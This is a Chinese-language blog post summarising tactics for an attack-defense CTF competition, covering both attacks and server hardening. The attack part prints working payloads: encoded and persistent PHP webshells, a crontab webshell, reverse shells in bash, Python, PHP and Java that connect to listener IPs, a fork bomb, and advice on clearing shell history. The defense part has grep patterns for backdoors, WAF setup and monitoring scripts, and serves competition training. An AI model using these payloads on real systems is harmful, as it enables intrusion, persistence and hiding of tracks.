> 原文链接: https://www.anquanke.com//post/id/245158 


# 国赛分区赛awd赛后总结-安心做awd混子


                                阅读量   
                                **127797**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t014b09264c422ce958.jpg)](https://p5.ssl.qhimg.com/t014b09264c422ce958.jpg)



最近参加了国赛分区赛，我所在的分区正好是awd赛制，所以总结了下关于awd的基操，方便新手入门

简单来说就是三步
1. 登录平台，查看规则，探索flag提交方式，比赛开始前有时间的话使用nmap或者httpscan等工具扫一下IP段，整理各队的IP（靶机的IP应该是比赛开始后才会给出）
1. 登录ssh-&gt;dump源码-&gt;D盾去后门-&gt;一人写批量脚本，一个人去修-&gt;部署waf，流量监控
1. 控制npc-&gt;加固npc（拿到别人的靶机也是一样），紧盯流量
下面来详细介绍具体流程



## 一般流程

### <a class="reference-link" name="1.%E7%99%BB%E5%BD%95%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%AF%94%E8%B5%9B%E4%BF%A1%E6%81%AF"></a>1.登录比赛平台，查看比赛信息

这此国赛主办方没有ssh密码，而是提供rsa公私钥，使用ssh-key方式进行登录

连接方法和密码方式相似，只不过是选择密钥而不用输入密码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e89d21af07f727b4.png)

如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面
- linux修改ssh即本地密码passwd
<li>修改后台登录密码mysql -u root -pshow databases；use test;show tables;
select * from admin;
updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;
flush privileges;
</li>
<li>修改mysql登录密码方法一：mysql&gt;set password for root[@localhost](https://github.com/localhost) =password(‘ocean888’);config.php文件中是有数据库的连接信息，执行完上条命令后**更改**此文件方法二：
mysqladmin -uroot -p 123456 password 123
root=用户名； 123456=旧密码； 123=新密码；
</li>
### <a class="reference-link" name="2.dump%E6%BA%90%E7%A0%81"></a>2.dump源码

使用ssh工具保留源码，复制两份，用d盾去扫一份

注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包

或者使用scp命令，后续会详细介绍使用方法

#### <a class="reference-link" name="%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"></a>数据库操作

**数据库备份**

登录数据库，命令备份数据库
- mysqldump -u db_user -p db_passwd db_name &gt; 1.sql //备份指定数据库
- cd /var/lib/mysqlmysqldump -u db_user -p db_passwd &gt; 1.sql //先进入数据库目录再备份
- mysqldump —all-databases &gt; 1.sql //备份所有数据库
**数据库还原**
- mysql -u db_user -p db_passwd db_name &lt; 1.sql //还原指定数据库
- cd /var/lib/mysqlmysql -u db_user db_passwd &lt; 1.sql //先进入数据库目录再还原
### <a class="reference-link" name="3.%E7%AB%99%E7%82%B9%E9%98%B2%E5%BE%A1%E9%83%A8%E7%BD%B2"></a>3.站点防御部署

#### <a class="reference-link" name="check%EF%BC%9A"></a>check：
1. 查看是否留有后门账户
1. 关注是否运行了“特殊”进程
1. 是否使用命令匹配一句话
1. 关闭不必要端口，如远程登陆端口，木马端口
#### <a class="reference-link" name="action%EF%BC%9A"></a>action：
1. d盾扫描删除预留后门文件，代码审计工具审计
1. 流量监控脚本部署
<li>WAF脚本部署**挂waf：**
<ul>
1. 每个文件前边加 require_once(waf.php);
1. 改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;; 包含在文件头auto_append_file=&lt;filename&gt;; 包含在文件尾
</ul>
注：如果挂了waf出现持续扣分，waf去掉
</li>
1. 文件监控脚本部署**注意：**现上好waf再上文件监控靶机没有python的话要先安python（视情况而定）
### <a class="reference-link" name="4.%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%BE%97%E5%88%86"></a>4.利用漏洞进行得分

利用漏洞进行既包括自己去审计挖掘漏洞，也包括看流量分析出其他师傅发现的漏洞的复现

### <a class="reference-link" name="5.%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E6%89%B9%E9%87%8F%E6%8B%BF%E5%88%86"></a>5.编写脚本批量拿分
1. 通过预留后门批量拿分
1. 批量修改ssh账号密码
1. 通过脚本批量获取flag
1. 脚本批量提交flag
以上就是简单来说awd开局需要做的5件事，一下从攻击和防御两个方面来具体介绍awd玩法



## 攻击

### <a class="reference-link" name="%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"></a>服务发现

使用nmap对c段或端口进行扫描（看主办方给的靶机情况而定）

#### <a class="reference-link" name="nmap"></a>nmap
<li>知道IP地址扫端口
<pre><code class="hljs css">.\nmap 10.241.180.159 -p1-65535
</code></pre>
</li>
<li>扫C段
<pre><code class="hljs">.\nmap 10.241.180.159/24
</code></pre>
</li>
<li>根据ip列表扫，有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机
<pre><code class="hljs css">nmap -iL ip.txt
</code></pre>
</li>
nmap扫描完毕后，win按住alt键

[![](https://p0.ssl.qhimg.com/t01d10881e9d5c1df6f.png)](https://p0.ssl.qhimg.com/t01d10881e9d5c1df6f.png)

只提取端口

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

awd中存在较多的主要是以下几种漏洞
- 命令执行，直接cat /flag，尽量混淆流量也可以通过命令执行执行上传一句话木马，直接用py脚本批量传，美哉
```
echo PD9waHAgZXZhbCgkX1JFUVVFU1RbJzEnXSk7ID8+Cg==|base64 -d&gt;&gt;.index.php

# &lt;?php eval($_REQUEST['1']); ?&gt;
```
- 文件读取，直接读取或者是伪协议方式读取flag
- sql注入，数据库中有flag，或者sql注入写shell
- 文件上传，绕过黑白名单上传一句话，小马拉大马或者不死马
- awd时间一般较短，所以漏洞不会太深，比较容易发现，有的会直接放几个明显的后门，考验选手们的手速
### <a class="reference-link" name="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"></a>权限维持

#### <a class="reference-link" name="%E8%BF%87%E7%9B%BE%E4%B8%80%E5%8F%A5%E8%AF%9D"></a>过盾一句话

```
&lt;?php $a=1;$b="a=".$_GET['a'];parse_str($b);print_r(`$a`)?&gt;
```

可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用

```
&lt;?php $a=1;$b="a=".$_GET['a'];parse_str($b);$k=(`$a`);header('cookie:'.$k);?&gt;

$a=1;$b="a=".$_GET['a'];parse_str($b);$k=(`$a`);header('cookie:'.$k);
```

#### <a class="reference-link" name="%E4%B8%8D%E6%AD%BB%E9%A9%AC"></a>不死马
- php file_put_contents写入不死马
```
file_put_contents('.1ndex.php',base64_decode('PD9waHAgIAogICAgc2V0X3RpbWVfbGltaXQoMCk7ICAKICAgIGlnbm9yZV91c2VyX2Fib3J0KDEpOyAgCiAgICB1bmxpbmsoX19GSUxFX18pOyAgCiAgICB3aGlsZSgxKXsgIAogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcubG5kZXgucGhwJywnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTAxNjBjMmVjNGY0MGQ3M2Y5MDYxZjg5NjcxMjExNTciKXtAZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+Jyk7ICAKICAgICAgICBzbGVlcCgwKTsgIAogICAgfQo/Pg=='));
```

get：pass=ocean888@.cn

post：cmd=system(“ls”);
- linux命令不死马
```
while true;do echo '&lt;?php eval($_POST["x"]);?&gt;' &gt; x.php;sleep 1;done
```
- 普通php不死马
```
&lt;?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.index.php';
$code = '&lt;?php if(md5($_GET["pass"])=="b1d2442581854c7e769e8ad870b50acd")`{`@eval($_REQUEST[a]);`}` ?&gt;';
while (1)`{`
    file_put_contents($file,$code);
    usleep(5);
`}`
?&gt;


#密码 ocean888@.cn
#文件名 .index.php  .DS_story

&lt;?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    //file_put_contents(__FILE__,'');
    while(1)`{`
        file_put_contents('path/webshell.php','&lt;?php @eval($_POST["password"]);?&gt;');
    `}`
?&gt;
```

密码复杂，生成文件隐藏 .DS_store(原 .DS_Store)
<li>
<h4 id="h4-crontab-">
<a class="reference-link" name="crontab%E5%86%99%E9%A9%AC"></a>crontab写马</h4>
</li>
```
system('echo "* * * * * echo \"&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\'50160c2ec4f40d73f9061f8967121157\')`{`@eval(\\\\\\\\\$_POST[1]);`}`  \" &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami');
```

密码：ocean888@.cn

`crontab -u www-data CRON_FILE` 来指定用户运行指定的定时任务

也可以使用cromtab直接在对方靶机上提交flag，隐蔽且狗

推荐：nu1l的ctfer从0到1，里面介绍了一些隐蔽的手段

#### <a class="reference-link" name="bash%E5%8F%8D%E5%BC%B9shell"></a>bash反弹shell

nc反弹shell

```
bash -i &gt;&amp; /dev/tcp/10.243.32.32/9 0&gt;&amp;1
本地 nc -l -p 8080
```

[![](https://p4.ssl.qhimg.com/t01c54a9b6fdf8ea8db.png)](https://p4.ssl.qhimg.com/t01c54a9b6fdf8ea8db.png)

[![](https://p1.ssl.qhimg.com/t0185d44e8c0aba596b.png)](https://p1.ssl.qhimg.com/t0185d44e8c0aba596b.png)

可以切换到bash命令去执行，但是使用bash命令会生成bash_history

#### <a class="reference-link" name="python%E5%8F%8D%E5%BC%B9shell"></a>python反弹shell

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

#### <a class="reference-link" name="php%E5%8F%8D%E5%BC%B9shell"></a>php反弹shell

```
php -r '$sock=fsockopen("10.243.32.53",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
```

此条命令将会返回一个和靶机相同的用户权限，使用php脚本反弹shell一般是www-data权限

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ed58560cfd5efff4.png)

[![](https://p4.ssl.qhimg.com/t0133a1827d6b90f776.png)](https://p4.ssl.qhimg.com/t0133a1827d6b90f776.png)

建议连着kill两次

#### <a class="reference-link" name="java%E5%8F%8D%E5%BC%B9shell"></a>java反弹shell

```
public class Revs `{`
    /**
    * @param args
    * @throws Exception 
    */
public static void main(String[] args) throws Exception `{`
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= `{`"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"`}`;
        Process p = r.exec(cmd);
        p.waitFor();
    `}`
`}`
```

保存为Revs.java文件，编译执行，成功反弹shell。

javac Revs.java<br>
java Revs

#### <a class="reference-link" name="%E6%B8%85%E9%99%A4bash_history"></a>清除bash_history

使用bash命令，会在root目录生成名为~/.bash_history的历史记录文件，建议清除记录，隐藏行踪

### <a class="reference-link" name="%E6%89%B9%E9%87%8F%E8%84%9A%E6%9C%AC"></a>批量脚本

#### <a class="reference-link" name="%E6%89%B9%E9%87%8F%E4%BA%A4flag"></a>批量交flag

有的比赛会提前说提交flag的方法，这样我们就可以提前写好脚本，找到漏洞小改一下就能用了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016b0ef4c88c600349.png)

假设有文件读取的话，就可以批量获取并提交flag

```
import requests
def getFlag(ip, port, dir)
    fullUrl = "http://" + ip + ":" + port + url
    res = requests.get(url = fullUrl)
    return res.text

def subFlag(r_time, ip, port, dir, token):
    #Set submit flag url
    f_url = 'http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21'
    #Set token
    while True:
        for q in ip:
            # q是单个ip，port是端口，shell为初始后门的地址，passwd为初始后门的密码
            flag_tmp = get_flag(ip, port, dir)
            s_f_pay = `{`
                'flag':flag_tmp,
                'token':token
            `}`

            # r = requests.post(url,headers=headers,data = json.dumps(data))
            r = requests.post(f_url, data = s_f_pay)
            print(r.text)
        time.sleep(r_time * 60)

if __name__ == '__main__' :
    # 这个可以看请况写个循环，遍历出所有ip
    subFlag(10, 172.35.19.11, 80, "/statics/1.php?file=../../../../../../flag", "FUPDSjgifpoejsiJIFPjipojfdsa")

```

#### <a class="reference-link" name="brup%E6%8F%92%E4%BB%B6"></a>brup插件

使用burp提供的burp-requests插件更快的写出poc，安装方法可以百度下，和其他的插件安装方法一致

当找到漏洞利用方法时，可以抓取流量，burp界面空白处右击，选择copy as requests

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01349d3c5f8f85a3e0.png)

直接复制到python脚本里就可以

效果如下

[![](https://p0.ssl.qhimg.com/t01cfbd67f482ef1b7a.png)](https://p0.ssl.qhimg.com/t01cfbd67f482ef1b7a.png)

#### <a class="reference-link" name="Aoiawd%E6%89%B9%E9%87%8F"></a>Aoiawd批量

Aoiawd是安恒实验室研发的一款awd神器，后面单独部分介绍

使用Aoiawd的流量监测功能，一键生成poc，批量拿flag

#### <a class="reference-link" name="%E6%90%85%E5%B1%8E"></a>搅屎

fork炸弹

```
# 参考: https://linux.cn/article-5685-1-rss.html
:()`{`:|:&amp;`}`;:
```



## 防御

防御主要包括三个监控：

文件监控

流量监控

端口监控

### <a class="reference-link" name="%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4"></a>实用命令
<li>查找可能的password
<pre><code class="hljs bash">cd /var/www/html
find .|xargs grep "password"
</code></pre>
</li>
<li>查找后门
<pre><code class="hljs ruby">find /var/www/html -name "*.php" |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('
</code></pre>
</li>
<li>查找flag的位置
<pre><code class="hljs coffeescript">使用 `find / -name *flag*` 或 `grep -rn "flag" *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分
</code></pre>
</li>
<li>备份网站源码和数据库
<ol>
- mobaxterm直接拖
</ol>
​ 备份数据库在dump源码部分有
<ol>
- linux命令进行备份
</ol>
<pre><code class="lang-bash hljs">scp -r -P Port remote_username[@remote_ip](https://github.com/remote_ip):remote_folder local_file
</code></pre>
</li>
<li>检查有没有多余无用端口对外开放
<pre><code class="lang-bash hljs">netstat -anptl
</code></pre>
</li>
### <a class="reference-link" name="%E9%83%A8%E7%BD%B2waf"></a>部署waf

waf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在不划算

还需要注意的是：上完waf检查服务是否可用

#### <a class="reference-link" name="%E6%97%A0check%E6%9C%BA%E5%88%B6"></a>无check机制

估计无check机制的比赛也没啥可玩性了，推荐watch bird和aoiawd，直接防护全开，替换flag，流量转发完事儿，或者有的连页面都不check的直接删站看他咋拿flag

#### <a class="reference-link" name="%E9%83%A8%E5%88%86%E6%A3%80%E6%9F%A5"></a>部分检查

部分检查允许使用部分小的waf，会检查页面完整性、服务完整性

直接github找一些waf即可，一下介绍一些waf部署方法

**有root权限**

1.

```
#每个文件前边加 require_once(waf.php);
find /var/www/html -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g"

find /var/www/html -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waf.php\");/g"

上waf：
$ find . -path ./waffffff -prune -o -type f -name "*.php" -print | xargs sed -i "s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/g"

下waf：
$ find . -path ./waffffff -prune -o -type f -name "*.php" -print | xargs sed -i "s/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/&lt;?php/g"
```

2.

```
vim php.ini

auto_append_file = "/dir/path/phpwaf.php"

重启Apache或者php-fpm就能生效了。
```

3.

```
改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;;  包含在文件头

auto_append_file=&lt;filename&gt;;  包含在文件尾
php_value auto_prepend_file "/dir/path/phpwaf.php"
```

注：如果挂了waf出现持续扣分，waf去掉

**只有user权限**

没写系统权限就只能在代码上面下手了，也就是文件包含。

这钟情况又可以用不同的方式包含。

1.

如果是框架型应用，那麽就可以添加在入口文件，例如index.php，

如果不是框架应用，可以在公共配置文件config.php等相关文件中包含。

```
include('phpwaf.php');
```

2.

替换index.php，也就是将index.php改名为index2.php，然后讲phpwaf.php改成index.php。

当然还没完，还要在原phpwaf.php中包含原来的index.php

```
index.php -&gt; index2.php
phpwaf.php -&gt;index.php
include('index2.php');
```
- 修改权限mysqll用户读表权限上传目录是否可执行的权限
<li>部署文件监控脚本php.ini
<pre><code class="hljs ini">auto_prepend_file = waf.php的路径;
</code></pre>
<pre><code class="hljs php">require_once('waf.php');

常用cms添加waf位置
PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
</code></pre>
</li>
#### <a class="reference-link" name="%E5%AE%8C%E5%85%A8%E6%A3%80%E6%9F%A5"></a>完全检查

完全检查大多出现在awd pwn中，比如不允许对漏洞函数进行修改

### <a class="reference-link" name="%E5%85%8B%E5%88%B6%E4%B8%8D%E6%AD%BB%E9%A9%AC"></a>克制不死马
<li>强行kill掉进程后重启服务（不建议）
<pre><code class="lang-bash hljs">ps -aux|grep ‘www-data’|awk ‘`{`print $2`}`’|xargs kill -9
</code></pre>
</li>
1. 建立一个和不死马相同名字的文件或者目录，sleep短于不死马
1. 写脚本不断删除
### <a class="reference-link" name="%E5%B9%B2%E6%8E%89%E5%8F%8D%E5%BC%B9shell"></a>干掉反弹shell

ps -ef / px -aux

出现www-data权限的/bin/sh一般为nc

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bad1fe97c1b010b9.png)

如果有一些进程杀不掉可以尝试www-data权限去杀

kill.php

```
&lt;?php
system("kill `ps -aux | grep www-data | grep apache2 | awk '`{`print $2`}`'`");
?&gt;
```

从浏览器访问，就是www-data权限

建议连着kill两次

### <a class="reference-link" name="%E6%94%B9%E5%AF%86%E7%A0%81"></a>改密码

如果有弱口令，拿到密码后先更改，然后用默认密码去批量登录其他的主机

#### <a class="reference-link" name="ssh%E5%AF%86%E7%A0%81"></a>ssh密码

ssh密码就是本机密码

passwd命令改密码

#### <a class="reference-link" name="phpmyadmin"></a>phpmyadmin

phpmyadmin的密码就是数据库的密码，直接改mysql密码

[![](https://p5.ssl.qhimg.com/t012dd1a4d7f7749a1b.png)](https://p5.ssl.qhimg.com/t012dd1a4d7f7749a1b.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018d05ba809bd86e00.png)

更改密码直接点执行就行，不要点生成（会随机生成新的密码）

#### <a class="reference-link" name="mysql"></a>mysql

修改mysql登录密码

方法一：

mysql&gt;set password for root[@localhost](https://github.com/localhost) =password(‘ocean888’);

config.php文件中是有数据库的连接信息，执行完上条命令后**更改**此文件

方法二：

mysqladmin -uroot -p 123456 password 123

root=用户名； 123456=旧密码； 123=新密码；

#### <a class="reference-link" name="%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81"></a>后台密码

修改后台登录密码

mysql -u root -p

show databases；

use test;

show tables;

select * from admin;

updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;

flush privileges;

### <a class="reference-link" name="%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7"></a>文件监控

#### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%9C%89python%E7%8E%AF%E5%A2%83"></a>本地有python环境

如果有python环境，py文件监控脚本一搜一大堆。。。

贴一个这个师傅写的：[https://www.shuzhiduo.com/A/GBJrKlDG50/](https://www.shuzhiduo.com/A/GBJrKlDG50/)

#### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89python%E7%8E%AF%E5%A2%83"></a>本地没有python环境

可以使用ssh远程去连接靶机进行监控
- vscode‐&gt;ssh插件或者是phpstorm，实时在线编辑
监听还原脚本‐&gt;5分钟还原一次

使用本地py环境运行，需要更改sshIP及端口

```
# -*- encoding: utf-8 -*-
'''
监听还原脚本‐&gt;5分钟还原一次
@File    :   awd.py
@Time    :   2020/08/09 20:44:54
@Author  :   iloveflag 
@Version :   1.0
@Contact :   iloveflag@outlook.com
@Desc    :  The Win32 port can only create tar archives,
            but cannot pipe its output to other programs such as gzip or compress, 
            and will not create tar.gz archives; you will have to use or simulate a batch pipe.
            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,
            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;
            for most purposes it is to be preferred to GNU Tar. 
'''

import paramiko
import os
import time

def web_server_command(command,transport): #对服务器执行命令
    ssh = paramiko.SSHClient()
    ssh._transport = transport
    stdin, stdout, stderr = ssh.exec_command(command)
    # print(stdout.read())


def web_server_file_action(ip, port, user, passwd, action): #对服务器文件操作
    try:
        transport = paramiko.Transport(ip, int(port))
        transport.connect(username=user, password=passwd)
        sftp = paramiko.SFTP.from_transport(transport)
        remote_path='/var/www/html/'
        remote_file = 'html.tar'
        local_path = 'C:/Users/'+os.getlogin()+'/Desktop/awd/'+ip+'/'
        web_server_command('cd '+remote_path+' &amp;&amp; tar -cvf '+remote_file+' ./',transport)
        if not(os.path.exists(local_path)):
            os.makedirs(local_path)
        if action == 'get':
            sftp.get(remote_path+remote_file,local_path+remote_file)
            web_server_command('rm -rf '+remote_path+remote_file,transport)
            print('服务器源码保存在'+local_path)
            print('正在解压:')
            os.system('cd '+local_path+' &amp; tar -xvf '+remote_file+' &amp;del '+remote_file)
            print('文件解压完成')
        else:
            web_server_command('rm -rf '+remote_path+'*',transport)
            print('清理服务器web目录')
            os.system('cd '+local_path+' &amp; tar -cvf '+remote_file+' ./*')
            sftp.put(local_path+remote_file, remote_path+remote_file)
            print('上传成功')
            web_server_command('cd '+remote_path+'&amp;&amp; tar -xvf '+remote_file+' &amp;&amp; rm -rf '+remote_file,transport)
            print('还原完毕')
            print('-----------------------------')
        sftp.close()
    except:
        pass
        print('download or upload error')


def web_server_mysql_action():
    #web_server_mysql_action
    pass
def web_server_status():
    #web_server_status
    pass
if __name__ == '__main__':
    web1_server_ip='10.241.180.159'
    web1_server_port='30021'
    web1_server_user='ctf'
    web1_server_passwd='123456'
    while(1):       
        for i in range(5,0,-1):
            time.sleep(1)
            print('倒计时'+str(i)+'秒')
        web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, 'put')
```

#### <a class="reference-link" name="scp%E5%91%BD%E4%BB%A4"></a>scp命令

```
scp -P 30022 -r -q web ctf@10.241.180.159:/var/www/html

# 按照提示输入密码即可
scp [可选参数] file_source file_target 
-P 指定传输到服务器的端口，默认为22
-r 递归传输整个web文件夹
-q 不显示传输进度条
```

[![](https://p0.ssl.qhimg.com/t01d3d69427cc2d5613.png)](https://p0.ssl.qhimg.com/t01d3d69427cc2d5613.png)

### <a class="reference-link" name="%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4"></a>常用linux命令

```
ssh &lt;-p 端口&gt; 用户名@IP　　
scp 文件路径  用户名@IP:存放路径　　　　
tar -zcvf web.tar.gz /var/www/html/　　
w 　　　　
pkill -kill -t &lt;用户tty&gt;　　 　　
ps aux | grep pid或者进程名　

#查看已建立的网络连接及进程
netstat -antulp | grep EST

#查看指定端口被哪个进程占用
lsof -i:端口号 或者 netstat -tunlp|grep 端口号

#结束进程命令
kill PID
killall &lt;进程名&gt;　　
kill - &lt;PID&gt;　　

#封杀某个IP或者ip段，如：.　　
iptables -I INPUT -s . -j DROP
iptables -I INPUT -s ./ -j DROP

#禁止从某个主机ssh远程访问登陆到本机，如123..　　
iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP

#检测所有的tcp连接数量及状态
netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn

#查看页面访问排名前十的IP
cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　

#查看页面访问排名前十的URL
cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -
```
- 如果有root权限可以用chattr命令防止系统中某个关键文件被修改chattr +i /etc/resolv.conf如果想进行修改，必须用命令”chattr -i”取消隐藏属性
- ls -t 按修改时间来看最新被修改的文件
### <a class="reference-link" name="%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"></a>流量监控

流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量

被上马一定要先备份到本地，再删除、去分析反打别人

#### <a class="reference-link" name="php%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"></a>php流量监控

```
&lt;?php

date_default_timezone_set('Asia/Shanghai');

$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip

$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名

$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数

$time = date('Y-m-d H:i:s',time()); //访问时间

$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";

// log记录

$fh = fopen("log.txt", "a");

fwrite($fh, $logadd);

fclose($fh);

?&gt;
```

#### <a class="reference-link" name="weblogger"></a>weblogger

[一个针对php的web流量抓取、分析的应用。](https://github.com/wupco/weblogger)

使用方法

```
cd /var/www/html/ (or other web dir)

   git clone https://github.com/wupco/weblogger.git

   chmod -R 777 weblogger/

   open http://xxxxx/weblogger/install.php in Web browser

   install it
```

### <a class="reference-link" name="wireshark"></a>wireshark

#### <a class="reference-link" name="%E8%BF%87%E6%BB%A4IP%E5%9C%B0%E5%9D%80"></a>过滤IP地址

> (1) ip.addr == 192.168.1.1 //只显示源/目的IP为192.168.1.1的数据包 (2) not ip.src == 1.1.1.1 //不显示源IP为1.1.1.1的数据包 (3 ip.src == 1.1.1.1 or ip.dst == 1.1.1.2 //只显示源IP为1.1.1.1或目的IP为1.1.1.2的数据包

#### <a class="reference-link" name="%E8%BF%87%E6%BB%A4%E7%AB%AF%E5%8F%A3"></a>过滤端口

> (1) tcp.port eq 80 #不管端口是来源还是目的都显示80端口 (2) tcp.port == 80 (3) tcp.port eq 2722 (4) tcp.port eq 80 or udp.port eq 80 (5) tcp.dstport == 80 #只显示tcp协议的目标端口80 (6) tcp.srcport == 80 #只显示tcp协议的来源端口80 (7) udp.port eq 15000 (8) tcp.port &gt;= 1 and tcp.port &lt;= 80 #过滤端口范围

#### <a class="reference-link" name="%E8%BF%87%E6%BB%A4MAC%E5%9C%B0%E5%9D%80"></a>过滤MAC地址

> (1) eth.dst == MAC地址 #过滤目标MAC (2) eth.src eq MAC地址 #过滤来源MAC (3)eth.addr eq MAC地址 #过滤来源MAC和目标MAC都等于MAC地址的

#### <a class="reference-link" name="http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E8%BF%87%E6%BB%A4"></a>http请求方式过滤

